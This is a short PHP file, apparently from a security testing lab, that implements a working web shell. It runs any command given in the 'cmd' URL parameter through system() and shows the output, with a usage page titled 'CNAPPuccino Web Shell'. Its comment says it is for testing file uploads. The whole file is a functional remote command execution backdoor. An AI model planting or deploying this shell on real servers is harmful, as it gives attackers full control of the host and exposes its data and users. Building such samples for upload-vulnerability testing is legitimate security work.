<?php
// Simple PHP web shell for testing file uploads
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
} else {
    echo "<h2>CNAPPuccino Web Shell</h2>";
    echo "<p>Usage: ?cmd=command</p>";
    echo "<p>Example: <a href='?cmd=whoami'>?cmd=whoami</a></p>";
}
?>